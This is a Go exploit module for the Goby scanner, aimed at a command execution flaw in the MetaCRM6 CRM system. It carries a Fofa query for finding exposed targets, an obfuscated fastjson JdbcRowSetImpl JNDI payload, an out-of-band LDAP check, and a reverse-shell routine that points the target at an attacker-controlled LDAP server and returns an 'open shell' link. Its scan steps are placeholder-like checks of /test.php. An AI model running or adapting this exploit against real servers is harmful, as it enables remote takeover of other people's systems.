package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Meta CRM System anotherValue Command Execution Vulnerability",
    "Description": "<p>The Meite CRM system is an essential technology and tool integration support platform for implementing customer relationship management. It is based on information technologies such as networks, communications, and computers, and can achieve seamless integration between different functional departments in the front-end and back-end of enterprises. CRM focuses on comprehensive management of the customer lifecycle.</p>",
    "Product": "MetaCRM6",
    "Homepage": "http://www.metasoft.com.cn/technology/index.html",
    "DisclosureDate": "2024-08-02",
    "PostTime": "2024-08-28",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "body=\"metasoft\" && body=\"login_module\"",
    "GobyQuery": "body=\"metasoft\" && body=\"login_module\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner: <a href=\"http://www.metasoft.com.cn/idea.html\">http://www.metasoft.com.cn/idea.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit the public from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "reverse",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "美特CRM系统 anotherValue 命令执行漏洞",
            "Product": "美特软件-MetaCRM6",
            "Description": "<p>美特CRM系统是实施客户关系管理必不可少的一套技术和工具集成支持平台，它基于网络、通讯、计算机等信息技术，能实现企业前台、后台不同职能部门的无缝衔接。CRM围绕客户生命周期全面管理。<br></p>",
            "Recommendation": "<p>1.关注厂商官网，及时关注更新信息：<a href=\"http://www.metasoft.com.cn/idea.html\">http://www.metasoft.com.cn/idea.html</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "HW-2024",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Meta CRM System anotherValue Command Execution Vulnerability",
            "Product": "MetaCRM6",
            "Description": "<p>The Meite CRM system is an essential technology and tool integration support platform for implementing customer relationship management. It is based on information technologies such as networks, communications, and computers, and can achieve seamless integration between different functional departments in the front-end and back-end of enterprises. CRM focuses on comprehensive management of the customer lifecycle.<br></p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner:&nbsp;<a href=\"http://www.metasoft.com.cn/idea.html\">http://www.metasoft.com.cn/idea.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit the public from accessing the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "HW-2024",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9946"
}`
	// 请注意：在编写POC时，请确认哪一种reverse方式，能够正常反弹Shell，在POC提交审核的时候，只保留能够成功反弹Shell的选项

	//setPayloadRequestHash函数需要再后面增加随机字符串，避免重名
	setPayloadRequestGzoqWt5EmC := func(hostInfo *httpclient.FixUrl, ldapURL string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		defineHeader := map[string]string{
			"Content-Type": "application/json",
		}

		urlPost := "/eai/someValue/anotherValue"
		rawPayload := fmt.Sprintf("{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"%s\",\"autoCommit\":true}}", ldapURL)
		resp, err := setPostRequest(hostInfo, urlPost, rawPayload, defineHeader)

		if resp == nil {
			return false, "", errors.New("Fail")
		}
		if err != nil {
			return false, "", err
		}
		ok = true
		vulURL = "/eai/someValue/anotherValue"
		return ok, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestGzoqWt5EmC

			ldapToken := goutils.RandomHexString(4)
			ldapURL, _ := godclient.GetGodLDAPCheckURL("U", ldapToken)

			ok, vulUrl, err := runPayload(hostInfo, ldapURL)
			if err != nil || !ok {
				return false
			}

			if godclient.PullExists(ldapToken, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestGzoqWt5EmC

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "反弹失败"
					}
				case <-time.After(time.Second * 25):
				}
			}
			
			waitSessionCh := make(chan string)
			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "reverse":
				waitSessionCh = make(chan string)
				// 构建反弹Shell LDAP
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					expResult.Output = err.Error()
					return expResult
				}
				ldapURL := "ldap://" + godclient.GetGodServerHost() + "/E" + godclient.GetKey() + rp
				
				go runPayload(expResult.HostInfo, ldapURL)
				setReverseWaitting(expResult, waitSessionCh)
				
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
